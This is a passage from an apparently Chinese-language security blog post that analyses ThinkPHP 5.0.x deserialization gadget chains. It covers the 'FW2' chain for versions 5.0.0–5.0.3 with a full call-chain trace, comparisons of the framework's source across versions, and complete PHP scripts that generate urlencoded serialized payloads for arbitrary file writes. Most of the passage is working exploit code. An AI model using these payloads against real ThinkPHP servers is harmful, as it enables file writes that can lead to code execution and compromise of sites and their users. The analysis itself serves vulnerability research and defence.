</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> \think\session\driver\<span class="title function_ invoke__">Memcache</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> \think\cache\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line"><span class="comment">//                &#x27;path&#x27; =&gt; &#x27;php://filter/convert.base64-decode/resource=&#x27; . $path,</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">path</span> = &quot;<span class="title class_">file_path</span>/<span class="title class_">file_name</span>&quot;;</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;file_content&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> \think\<span class="title function_ invoke__">Process</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="FW2（影响-5-0-0-5-0-3）"><a href="#FW2（影响-5-0-0-5-0-3）" class="headerlink" title="FW2（影响 5.0.0 - 5.0.3）"></a>FW2（影响 5.0.0 - 5.0.3）</h2><h3 id="基本信息-5"><a href="#基本信息-5" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p><strong>影响范围</strong> ：5.0.0 - 5.0.3</p>
</li>
<li><p><strong>生成命令</strong> ：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPFW2.svg"
                      alt="TPFW2"
                ></p>
</li>
<li><p><strong>反序列化调用链</strong> ：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">think\Process-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">└── <span class="title function_ invoke__">stop</span>()</span><br><span class="line">    ├── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) == <span class="literal">false</span>              <span class="comment">// $status 为默认值 &quot;ready&quot;</span></span><br><span class="line">    ├── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>)                    <span class="comment">// 同样 $status != &quot;started&quot; → return</span></span><br><span class="line">    └── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>]) == <span class="literal">true</span></span><br><span class="line">        └── <span class="title function_ invoke__">close</span>()</span><br><span class="line">            └── <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">close</span>()</span><br><span class="line">                <span class="comment">// $processPipes 为 think\model\Relation，无 close 方法，触发 __call</span></span><br><span class="line"></span><br><span class="line">think\model\Relation-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;close&quot;</span>, [])</span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query &amp;&amp; <span class="variable language_">$this</span>-&gt;type === <span class="built_in">self</span>::<span class="variable constant_">HAS_MANY</span>)</span><br><span class="line">    └── <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;where)) == <span class="literal">true</span>              <span class="comment">// ✅ 设置 $where = &quot;file_content&quot;</span></span><br><span class="line">        └── <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;where)</span><br><span class="line">            <span class="comment">// $query = think\console\Output，没有 where 方法，触发 __call</span></span><br><span class="line"></span><br><span class="line">think\console\Output-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;where&quot;</span>, [<span class="string">&#x27;file_content&#x27;</span>])</span><br><span class="line">└── <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) == <span class="literal">true</span>     <span class="comment">// ✅ $styles = [&#x27;where&#x27;]</span></span><br><span class="line">    ├── <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>)                 <span class="comment">// [&#x27;file_content&#x27;] → [&#x27;where&#x27;, &#x27;file_content&#x27;]</span></span><br><span class="line">    └── <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], [<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;file_content&#x27;</span>])</span><br><span class="line">        └── <span class="title function_ invoke__">block</span>(<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;file_content&#x27;</span>)</span><br><span class="line">            └── <span class="title function_ invoke__">writeln</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>)</span><br><span class="line">                └── <span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>)</span><br><span class="line">                    └── <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>)</span><br><span class="line">                        <span class="comment">// $handle = think\session\driver\Memcache → write</span></span><br><span class="line"></span><br><span class="line">think\session\driver<span class="title class_">\Memcache</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">└── <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27;</span>, <span class="literal">true</span>, <span class="number">0</span>, <span class="number">3600</span>)</span><br><span class="line">    <span class="comment">// $handler = think\cache\driver\Memcached → set()</span></span><br><span class="line"></span><br><span class="line">think\cache\driver<span class="title class_">\Memcached</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)</span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) == <span class="literal">true</span>     <span class="comment">// ✅ 第一次写入，设置 $first = true</span></span><br><span class="line">    └── <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)</span><br><span class="line">    └── <span class="variable">$expire</span> = <span class="number">0</span> == <span class="variable">$expire</span> ? <span class="number">0</span> : <span class="title function_ invoke__">time</span>() + <span class="variable">$expire</span></span><br><span class="line">    └── <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expire</span>)     <span class="comment">// File::set 第一次写入（value 不可控）</span></span><br><span class="line">        ├── 生成缓存文件路径 <span class="variable">$filename</span></span><br><span class="line">        ├── <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="literal">true</span>)</span><br><span class="line">        └── <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)</span><br><span class="line">    └── <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>)       <span class="comment">// 第二次调用 set（value 可控）</span></span><br><span class="line"></span><br><span class="line">think\cache\driver<span class="title class_">\Memcached</span>::<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$key</span>)</span><br><span class="line">└── <span class="variable">$value</span> = <span class="variable">$key</span> <span class="comment">// ✅ $key = &#x27;&lt;where&gt;file_content&lt;/where&gt;&#x27; 可控</span></span><br><span class="line">└── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&quot;tag_&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag), <span class="variable">$value</span>, <span class="number">0</span>)</span><br><span class="line">    └── think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">set</span>(name = <span class="string">&quot;tag_xxx&quot;</span>, value = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">        ├── <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">        └── <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)        <span class="comment">// ✅ 内容可控 → 文件写入原始数据</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用链分析-5"><a href="#调用链分析-5" class="headerlink" title="调用链分析"></a>调用链分析</h3><p>FW2 与 FW1 的整体过程基本上是一致的，唯一的不同点是 FW2 将 FW1 的 <code>think\model\relation\HasMany</code> 替换为了 <code>think\model\Relation</code>。</p>
<p>这是因为在 5.0.3 中 <code>Relation</code> 类的 <code>__call</code> 方法可以直接调用到 <code>$this-&gt;query-&gt;where</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">HAS_MANY</span>         = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">HAS_MANY</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;where)) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;where); <span class="comment">// 👈 使用这个更方便一些</span></span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) &#123;</span><br><span class="line">                    <span class="comment">// 对应 5.0.4+ 的 HasMany 的 baseQuery</span></span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">             <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>而 5.0.4+ 的 <code>Relation</code> 类是一个抽象类，它的 <code>__call</code> 方法会调用 <code>$this-&gt;baseQuery</code> 函数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query) &#123;</span><br><span class="line">        <span class="comment">// 执行基础查询</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">baseQuery</span>();</span><br><span class="line">        <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>而 <code>$this-&gt;baseQuery</code> 函数来自于 <code>Relation</code> 具体的实现类。而 FW1 采用的是 <code>HasMany</code>，因此会调用 <code>$this-&gt;baseQuery-&gt;where</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行基础查询（进执行一次）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">baseQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;baseQuery)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) &#123;</span><br><span class="line">            <span class="comment">// 关联查询带入关联条件</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;baseQuery = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外一点不同的是 <code>think\cache\driver\File-&gt;set</code> 写入文件部分。在 5.0.3 中，我们的可控数据 <code>$data</code> 是拼接在 PHP 脚本内部的。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="variable">$data</span> . <span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></div>

<p>两次文件写入内容如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000b:1;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000s:27:&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>而在 5.0.4+ 的 <code>think\cache\driver\File-&gt;set</code> 写入文件部分，可控数据 <code>$data</code> 是拼接在 PHP 脚本后面的。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></div>

<p>两次文件写入内容如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000</span></span><br><span class="line"><span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">b:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000</span></span><br><span class="line"><span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">s:<span class="number">27</span>:<span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用脚本-5"><a href="#利用脚本-5" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>\<span class="title class_">HasMany</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processPipes</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processInformation</span> = [<span class="string">&#x27;running&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processPipes = <span class="keyword">new</span> <span class="title class_">HasMany</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Relation</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">stdClass</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasMany</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$localKey</span> = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$foreignKey</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;foreignKey = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125; = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 